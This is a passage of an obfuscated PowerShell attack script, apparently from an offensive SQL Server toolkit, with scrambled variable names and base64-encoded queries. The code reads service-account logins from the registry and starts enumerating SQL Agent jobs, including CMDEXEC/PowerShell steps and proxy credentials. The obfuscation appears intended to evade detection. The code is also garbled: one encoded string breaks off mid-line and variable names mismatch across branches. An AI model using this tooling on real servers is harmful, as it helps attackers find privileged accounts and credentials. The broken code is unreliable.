AAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAALQAtACAARwBlAHQAIABNAFMATwBMAEEAUAAgAC0AIABDAGEAbABjAHUAbABhAHQAZQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUAWABFAEMAVQBUAEUACQAJAG0AYQBzAHQAZQByAC4AZABiAG8ALgB4AHAAXwBpAG4AcwB0AGEAbgBjAGUAXwByAGUAZwByAGUAYQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE4AJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAnACwAIABAAE0AUwBPAEwAQQBQAEkAbgBzAHQAYQBuAGMAZQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE4AJwBPAGIAagBlAGMAdABOAGEAbQBlACcALABAAEEAbgBhAGwAeQBzAGkAcwBMAG8AZwBpAG4AIABPAFUAVABQAFUAVAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAtAC0AIABHAGUAdAAgAFIAZQBwAG8AcgB0AGkAbgBnACAALQAgAEMAYQBsAGMAdQBsAGEAdABlAGQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBYAEUAQwBVAFQARQAJAAkAbQBhAHMAdABlAHIALgBkAGIAbwAuAHgAcABfAGkAbgBzAHQAYQBuAGMAZQBfAHIAZQBnAHIAZQBhAGQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAATgAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFACcALAAgAEAAUgBlAHAAbwByAHQASQBuAHMAdABhAG4AYwBlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAATgAnAE8AYgBqAGUAYwB0AE4AYQBtAGUAJwAsAEAAUgBlAHAAbwByAHQATABvAGcAaQBuACAATwBVAFQAUABVAFQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAALQAtACAARwBlAHQAIABTAFEATAAgAFMAZQByAHYAZQByACAARABUAFMAIABTAGUAcgB2AGUAcgAgAC8AIABBAG4AYQBsAHkAcwBpAHMAIAAtACAAQwBhAGwAdQBsAGEAdABlAGQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBYAEUAQwBVAFQARQAJAAkAbQBhAHMAdABlAHIALgBkAGIAbwAuAHgAcABfAGkAbgBzAHQAYQBuAGMAZQBfAHIAZQBnAHIAZQBhAGQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAATgAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFACcALAAgAEAASQBuAHQAZQBnAHIAYQB0AGkAbwBuAFYAZQByAHMAaQBvAG4ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAATgAnAE8AYgBqAGUAYwB0AE4AYQBtAGUAJwAsAEAASQBuAHQAZQBnAHIAYQB0AGkAbwBuAEQAdABzAEwAbwBnAGkAbgAgAE8AVQBUAFAAVQBUAA==')))
            ${__/\___/\/=\/==\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CQAsAFsAQgByAG8AdwBzAGUAcgBMAG8AZwBpAG4AXQAgAD0AIABAAEIAcgBvAHcAcwBlAHIATABvAGcAaQBuACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAWwBXAHIAaQB0AGUAcgBMAG8AZwBpAG4AXQAgAD0AIABAAFcAcgBpAHQAZQByAEwAbwBnAGkAbgAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFsAQQBuAGEAbAB5AHMAaQBzAEwAbwBnAGkAbgBdACAAPQAgAEAAQQBuAGEAbAB5AHMAaQBzAEwAbwBnAGkAbgAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFsAUgBlAHAAbwByAHQATABvAGcAaQBuAF0AIAA9ACAAQABSAGUAcABvAHIAdABMAG8AZwBpAG4ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAWwBJAG4AdABlAGcAcgBhAHQAaQBvAG4ATABvAGcAaQBuAF0AIAA9ACAAQABJAG4AdABlAGcAcgBhAHQAaQBvAG4ARAB0AHMATABvAGcAaQBuAA==')))
        }
        else
        {
            ${___/==\_/\/=\/=\_} = ''
            ${__/\___/\/=\/==\_} = ''
        }
        $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAC0ALQAgAFMAZQB0AHUAcAAgAHYAYQByAGkAYQBiAGwAZQBzAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABEAEUAQwBMAEEAUgBFAAkACQBAAFMAUQBMAFMAZQByAHYAZQByAEkAbgBzAHQAYQBuAGMAZQAJAFYAQQBSAEMASABBAFIAKAAyADUAMAApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABEAEUAQwBMAEEAUgBFAAkACQBAAE0AUwBPAEwAQQBQAEkAbgBzAHQAYQBuAGMAZQAJAAkAVgBBAFIAQwBIAEEAUgAoADIANQAwACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQARQBDAEwAQQBSAEUACQAJAEAAUgBlAHAAbwByAHQASQBuAHMAdABhAG4AYwBlACAACQBWAEEAUgBDAEgAQQBSACgAMgA1ADAAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAARABFAEMATABBAFIARQAJAAkAQABBAGcAZQBuAHQASQBuAHMAdABhAG4AYwBlAAkAIAAJAFYAQQBSAEMASABBAFIAKAAyADUAMAApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABEAEUAQwBMAEEAUgBFAAkACQBAAEkAbgB0AGUAZwByAGEAdABpAG8AbgBWAGUAcgBzAGkAbwBuAAkAVgBBAFIAQwBIAEEAUgAoADIANQAwACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQARQBDAEwAQQBSAEUACQAJAEAARABCAEUAbgBnAGkAbgBlAEwAbwBnAGkAbgAJAAkAVgBBAFIAQwBIAEEAUgAoADEAMAAwACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQARQBDAEwAQQBSAEUACQAJAEAAQQBnAGUAbgB0AEwAbwBnAGkAbgAJAAkAIAAgACAAIABWAEEAUgBDAEgAQQBSACgAMQAwADAAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAARABFAEMATABBAFIARQAJAAkAQABCAHIAbwB3AHMAZQByAEwAbwBnAGkAbgAJAAkAVgBBAFIAQwBIAEEAUgAoADEAMAAwACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQARQBDAEwAQQBSAEUAIAAgACAAIAAgAEAAVwByAGkAdABlAHIATABvAGcAaQBuAAkACQBWAEEAUgBDAEgAQQBSACgAMQAwADAAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAARABFAEMATABBAFIARQAJAAkAQABBAG4AYQBsAHkAcwBpAHMATABvAGcAaQBuAAkACQBWAEEAUgBDAEgAQQBSACgAMQAwADAAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAARABFAEMATABBAFIARQAJAAkAQABSAGUAcABvAHIAdABMAG8AZwBpAG4ACQAJAFYAQQBSAEMASABBAFIAKAAxADAAMAApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABEAEUAQwBMAEEAUgBFAAkACQBAAEkAbgB0AGUAZwByAGEAdABpAG8AbgBEAHQAcwBMAG8AZwBpAG4ACQBWAEEAUgBDAEgAQQBSACgAMQAwADAAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAALQAtACAARwBlAHQAIABTAGUAcgB2AGkAYwBlACAAUABhAHQAaABzACAAZgBvAHIAIABkAGUAZgBhAHUAbAB0ACAAYQBuAGQAIABuAGEAbQBlACAAaQBuAHMAdABhAG4AYwBlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAGYAIABAAEAAUwBFAFIAVgBJAEMARQBOAEEATQBFACAAPQAgACcATQBTAFMAUQBMAFMARQBSAFYARQBSACcAIABvAHIAIABAAEAAUwBFAFIAVgBJAEMARQBOAEEATQBFACAAPQAgAEgATwBTAFQAXwBOAEEATQBFACgAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQgBFAEcASQBOAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAtAC0AIABEAGUAZgBhAHUAbAB0ACAAaQBuAHMAdABhAG4AYwBlACAAcABhAHQAaABzAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAGUAdAAgAEAAUwBRAEwAUwBlAHIAdgBlAHIASQBuAHMAdABhAG4AYwBlACAAPQAgACcAUwBZAFMAVABFAE0AXABDAHUAcgByAGUAbgB0AEMAbwBuAHQAcgBvAGwAUwBlAHQAXABTAGUAcgB2AGkAYwBlAHMAXABNAFMAUwBRAEwAUwBFAFIAVgBFAFIAJwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwBlAHQAIABAAE0AUwBPAEwAQQBQAEkAbgBzAHQAYQBuAGMAZQAgAD0AIAAnAFMAWQBTAFQARQBNAFwAQwB1AHIAcgBlAG4AdABDAG8AbgB0AHIAbwBsAFMAZQB0AFwAUwBlAHIAdgBpAGMAZQBzAFwATQBTAFMAUQBMAFMAZQByAHYAZQByAE8ATABBAFAAUwBlAHIAdgBpAGMAZQAnAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAGUAdAAgAEAAUgBlAHAAbwByAHQASQBuAHMAdABhAG4AYwBlACAAPQAgACcAUwBZAFMAVABFAE0AXABDAHUAcgByAGUAbgB0AEMAbwBuAHQAcgBvAGwAUwBlAHQAXABTAGUAcgB2AGkAYwBlAHMAXABSAGUAcABvAHIAdABTAGUAcgB2AGUAcgAnAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAGUAdAAgAEAAQQBnAGUAbgB0AEkAbgBzAHQAYQBuAGMAZQAgAD0AIAAnAFMAWQBTAFQARQBNAFwAQwB1AHIAcgBlAG4AdABDAG8AbgB0AHIAbwBsAFMAZQB0AFwAUwBlAHIAdgBpAGMAZQBzAFwAUwBRAEwAUwBFAFIAVgBFAFIAQQBHAEUATgBUACcADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAZQB0ACAAQABJAG4AdABlAGcAcgBhAHQAaQBvAG4AVgBlAHIAcwBpAG8AbgAgACAAPQAgACcAUwBZAFMAVABFAE0AXABDAHUAcgByAGUAbgB0AEMAbwBuAHQAcgBvAGwAUwBlAHQAXABTAGUAcgB2AGkAYwBlAHMAXABNAHMARAB0AHMAUwBlAHIAdgBlAHIAJwArACAAUwBVAEIAUwBUAFIASQBOAEcAKABDAEEAUwBUACgAUwBFAFIAVgBFAFIAUABSAE8AUABFAFIAVABZACgAJwBwAHIAbwBkAHUAYwB0AHYAZQByAHMAaQBvAG4AJwApACAAQQBTACAAVgBBAFIAQwBIAEEAUgAoADIANQA1ACkAKQAsADAALAAgADMAKQAgACsAIAAnADAAJwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBOAEQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUATABTAEUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEIARQBHAEkATgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAALQAtACAATgBhAG0AZQBkACAAaQBuAHMAdABhAG4AYwBlACAAcABhAHQAaABzAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAGUAdAAgAEAAUwBRAEwAUwBlAHIAdgBlAHIASQBuAHMAdABhAG4AYwBlACAAPQAgACcAUwBZAFMAVABFAE0AXABDAHUAcgByAGUAbgB0AEMAbwBuAHQAcgBvAGwAUwBlAHQAXABTAGUAcgB2AGkAYwBlAHMAXABNAFMAUwBRAEwAJAAnACAAKwAgAGMAYQBzAHQAKABAAEAAUwBFAFIAVgBJAEMARQBOAEEATQBFACAAYQBzACAAdgBhAHIAYwBoAGEAcgAoADIANQAwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwBlAHQAIABAAE0AUwBPAEwAQQBQAEkAbgBzAHQAYQBuAGMAZQAgAD0AIAAnAFMAWQBTAFQARQBNAFwAQwB1AHIAcgBlAG4AdABDAG8AbgB0AHIAbwBsAFMAZQB0AFwAUwBlAHIAdgBpAGMAZQBzAFwATQBTAE8ATABBAFAAJAAnACAAKwAgAGMAYQBzAHQAKABAAEAAUwBFAFIAVgBJAEMARQBOAEEATQBFACAAYQBzACAAdgBhAHIAYwBoAGEAcgAoADIANQAwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwBlAHQAIABAAFIAZQBwAG8AcgB0AEkAbgBzAHQAYQBuAGMAZQAgAD0AIAAnAFMAWQBTAFQARQBNAFwAQwB1AHIAcgBlAG4AdABDAG8AbgB0AHIAbwBsAFMAZQB0AFwAUwBlAHIAdgBpAGMAZQBzAFwAUgBlAHAAbwByAHQAUwBlAHIAdgBlAHIAJAAnACAAKwAgAGMAYQBzAHQAKABAAEAAUwBFAFIAVgBJAEMARQBOAEEATQBFACAAYQBzACAAdgBhAHIAYwBoAGEAcgAoADIANQAwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwBlAHQAIABAAEEAZwBlAG4AdABJAG4AcwB0AGEAbgBjAGUAIAA9ACAAJwBTAFkAUwBUAEUATQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAFMAZQByAHYAaQBjAGUAcwBcAFMAUQBMAEEAZwBlAG4AdAAkACcAIAArACAAYwBhAHMAdAAoAEAAQABTAEUAUgBWAEkAQwBFAE4AQQBNAEUAIABhAHMAIAB2AGEAcgBjAGgAYQByACgAMgA1ADAAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAGUAdAAgAEAASQBuAHQAZQBnAHIAYQB0AGkAbwBuAFYAZQByAHMAaQBvAG4AIAAgAD0AIAAnAFMAWQBTAFQARQBNAFwAQwB1AHIAcgBlAG4AdABDAG8AbgB0AHIAbwBsAFMAZQB0AFwAUwBlAHIAdgBpAGMAZQBzAFwATQBzAEQAdABzAFMAZQByAHYAZQByACcAKwAgAFMAVQBCAFMAVABSAEkATgBHACgAQwBBAFMAVAAoAFMARQBSAFYARQBSAFAAUgBPAFAARQBSAFQAWQAoACcAcAByAG8AZAB1AGMAdAB2AGUAcgBzAGkAbwBuACcAKQAgAEEAUwAgAFYAQQBSAEMASABBAFIAKAAyADUANQApACkALAAwACwAIAAzACkAIAArACAAJwAwACcADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUATgBEAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAtAC0AIABHAGUAdAAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIAAtACAAQwBhAGwAYwB1AGwAYQB0AGUAZAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBYAEUAQwBVAFQARQAJAAkAbQBhAHMAdABlAHIALgBkAGIAbwAuAHgAcABfAGkAbgBzAHQAYQBuAGMAZQBfAHIAZQBnAHIAZQBhAGQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE4AJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAnACwAIABAAFMAUQBMAFMAZQByAHYAZQByAEkAbgBzAHQAYQBuAGMAZQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABOACcATwBiAGoAZQBjAHQATgBhAG0AZQAnACwAQABEAEIARQBuAGcAaQBuAGUATABvAGcAaQBuACAATwBVAFQAUABVAFQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0ALQAgAEcAZQB0ACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAEEAZwBlAG4AdAAgAC0AIABDAGEAbABjAHUAbABhAHQAZQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABFAFgARQBDAFUAVABFAAkACQBtAGEAcwB0AGUAcgAuAGQAYgBvAC4AeABwAF8AaQBuAHMAdABhAG4AYwBlAF8AcgBlAGcAcgBlAGEAZAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAATgAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFACcALAAgAEAAQQBnAGUAbgB0AEkAbgBzAHQAYQBuAGMAZQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABOACcATwBiAGoAZQBjAHQATgBhAG0AZQAnACwAQABBAGcAZQBuAHQATABvAGcAaQBuACAATwBVAFQAUABVAFQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAewBfAF8AXwAvAD0APQBcAF8ALwBcAC8APQBcAC8APQBcAF8AfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAALQAtACAARABpAHMAbABwAGEAeQAgAHIAZQBzAHUAbAB0AHMADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMARQBMAEUAQwBUAAkACQAnACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAJwAgAGEAcwAgAFsAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAnACQASQBuAHMAdABhAG4AYwBlACcAIABhAHMAIABbAEkAbgBzAHQAYQBuAGMAZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFsARABCAEUAbgBnAGkAbgBlAEwAbwBnAGkAbgBdACAAPQAgAEAARABCAEUAbgBnAGkAbgBlAEwAbwBnAGkAbgAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABbAEEAZwBlAG4AdABMAG8AZwBpAG4AXQAgAD0AIABAAEEAZwBlAG4AdABMAG8AZwBpAG4ADQAKACAAIAAgACAAIAAgACAAIAAkAHsAXwBfAC8AXABfAF8AXwAvAFwALwA9AFwALwA9AD0AXABfAH0A')))
        ${/=\_____/\/\/=\__} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${/===\/=\/\__/\___} = ${/===\/=\/\__/\___} + ${/=\_____/\/\/=\__}
    }
    End
    {
        ${_/=\/\/\/\__/====} = New-Object -TypeName System.Data.DataTable
        $null = ${_/=\/\/\/\__/====}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))) 
        $null = ${_/=\/\/\/\__/====}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA==')))) 
        $null = ${_/=\/\/\/\__/====}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBUAHkAcABlAA==')))) 
        $null = ${_/=\/\/\/\__/====}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBBAGMAYwBvAHUAbgB0AA=='))))
        ${_/=\/\/\/\__/====}.Rows.Add(${/===\/=\/\__/\___}.ComputerName,${/===\/=\/\__/\___}.Instance,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBnAGUAbgB0AFMAZQByAHYAaQBjAGUA'))),${/===\/=\/\__/\___}.AgentLogin)
        ${_/=\/\/\/\__/====}.Rows.Add(${/===\/=\/\__/\___}.ComputerName,${/===\/=\/\__/\___}.Instance,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAGEAbAB5AHMAaQBzAFMAZQByAHYAaQBjAGUA'))),${/===\/=\/\__/\___}.AnalysisLogin)
        ${_/=\/\/\/\__/====}.Rows.Add(${/===\/=\/\__/\___}.ComputerName,${/===\/=\/\__/\___}.Instance,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgByAG8AdwBzAGUAcgBTAGUAcgB2AGkAYwBlAA=='))),${/===\/=\/\__/\___}.BrowserLogin)
        ${_/=\/\/\/\__/====}.Rows.Add(${/===\/=\/\__/\___}.ComputerName,${/===\/=\/\__/\___}.Instance,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAUwBlAHIAdgBpAGMAZQA='))),${/===\/=\/\__/\___}.DBEngineLogin)
        ${_/=\/\/\/\__/====}.Rows.Add(${/===\/=\/\__/\___}.ComputerName,${/===\/=\/\__/\___}.Instance,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQBnAHIAYQB0AGkAbwBuAFMAZQByAHYAaQBjAGUA'))),${/===\/=\/\__/\___}.IntegrationLogin)
        ${_/=\/\/\/\__/====}.Rows.Add(${/===\/=\/\__/\___}.ComputerName,${/===\/=\/\__/\___}.Instance,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHAAbwByAHQAUwBlAHIAdgBpAGMAZQA='))),${/===\/=\/\__/\___}.ReportLogin)
        ${_/=\/\/\/\__/====}.Rows.Add(${/===\/=\/\__/\___}.ComputerName,${/===\/=\/\__/\___}.Instance,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAHIAUwBlAHIAdgBpAGMAZQA='))),${/===\/=\/\__/\___}.WriterLogin)
        ${_/=\/\/\/\__/====}
    }
}
Function  Get-SQLAgentJob
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only return SQL Agent jobs for specific subsystems.')]
         [ValidateSet("TSQL","PowerShell","CMDEXEC","PowerShell","ActiveScripting","ANALYSISCOMMAND","ANALYSISQUERY","Snapshot","Distribution","LogReader","Merge","QueueReader")]
        [String]$SubSystem,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only return SQL Agent jobs that have a command that includes a specific keyword.')]
        [String]$Keyword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only return SQL Agent jobs using a proxy credentials.')]
        [Switch]$UsingProxyCredential,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Only return SQL Agent jobs using a specific proxy credential.')]
        [String]$ProxyCredential,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $SuppressVerbose){
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAIABTAGUAcgB2AGUAcgAgAEEAZwBlAG4AdAAgAEoAbwBiACAAUwBlAGEAcgBjAGgAIABTAHQAYQByAHQAaQBuAGcALgAuAC4A')))
        }
        ${/=\_____/\/\/=\__} = New-Object -TypeName System.Data.DataTable
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))     
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAE4AYQBtAGUA'))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SgBvAGIAXwBJAGQA'))))                                                                                                                                                                                        
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SgBvAGIAXwBOAGEAbQBlAA=='))))                                                                                                                                                                                                 
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SgBvAGIAXwBEAGUAcwBjAHIAaQBwAHQAaQBvAG4A'))))  
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SgBvAGIAXwBPAHcAbgBlAHIA'))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AF8ASQBkAA=='))))  
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AF8AQwByAGUAZABlAG4AdABpAGEAbAA='))))                                                                                                                                                                                                          
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAZQBfAEMAcgBlAGEAdABlAGQA')))) 
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABfAFIAdQBuAF8ARABhAHQAZQA='))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGEAYgBs
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA'))))                                                                                                                                                                                        
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGUAcABfAE4AYQBtAGUA'))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAUwB5AHMAdABlAG0A'))))
        $null = ${/=\_____/\/\/=\__}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZAA='))))          
        if($SubSystem)
        {
            ${___/=\_/\_/==\/=\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAHMAdABlAHAAcwAuAHMAdQBiAHMAeQBzAHQAZQBtACAAbABpAGsAZQAgACcAJABTAHUAYgBTAHkAcwB0AGUAbQAnAA==')))
        }
        else
        {
            ${_/\/===\/\/==\/=\} = ''
        }    
        if($Keyword)
        {
            ${/==\/===\__/\/\/\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAHMAdABlAHAAcwAuAGMAbwBtAG0AYQBuAGQAIABsAGkAawBlACAAJwAlACQASwBlAHkAdwBvAHIAZAAlACcA')))
        }
        else
        {
            ${/==\/===\__/\/\/\} = ''
        }   
        if($UsingProxyCredential)
        {
            ${/==\/\___/\/\__/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAHMAdABlAHAAcwAuAHAAcgBvAHgAeQBfAGkAZAAgAD4AIAAwAA==')))
        }
        else
        {
            ${/==\/\___/\/\__/\} = ''
        } 
        if($ProxyCredential)
        {
            ${/===\_/\_/=\/====} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAHAAcgBvAHgAaQBlAHMALgBuAGEAbQBlACAAbABpAGsAZQAgACcAJABQAHIAbwB4AHkAQwByAGUAZABlAG4AdABpAGEAbAAnAA==')))
        }
        else
        {
            ${/===\_/\_/=\/====} = ''
        }                                                                                                                                                                                                 
    }
    Process
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if($DAC)
        {
            ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
        }
        else
        {
            ${__/=\____/\__/==\} = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
        }
        try
        {
            ${__/=\____/\__/==\}.Open()
            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))                
            }
            ${_/==\_/==\___/\_/} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            ${/=\_/==\__/\/\_/=} = ${_/==\_/==\___/\_/}.CurrentLogin
            $ComputerName = ${_/==\_/==\___/\_/}.ComputerName
            ${/=========\__/=\/} = ${_/==\_/==\___/\_/}.IsSysadmin
